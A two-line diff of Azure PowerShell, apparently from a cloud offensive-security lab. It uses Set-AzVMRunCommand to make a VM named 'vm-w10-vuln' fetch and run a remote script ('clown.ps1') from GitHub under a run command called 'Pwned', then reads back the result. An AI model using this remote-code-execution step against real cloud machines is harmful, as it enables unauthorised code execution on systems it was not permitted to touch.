@@ -1,0 +1,2 @@
+Set-AzVMRunCommand -ResourceGroupName rg-azure-offensive -VMName vm-w10-vuln -RunCommandName Pwned -Location uksouth -SourceScriptUri 'https://raw.githubusercontent.com/SecureHats/miaow/main/clown.ps1'
+(Get-AzVMRunCommand -ResourceGroupName rg-azure-offensive -VMName vm-w10-vuln -RunCommandName Pwned -Expand InstanceView).InstanceView
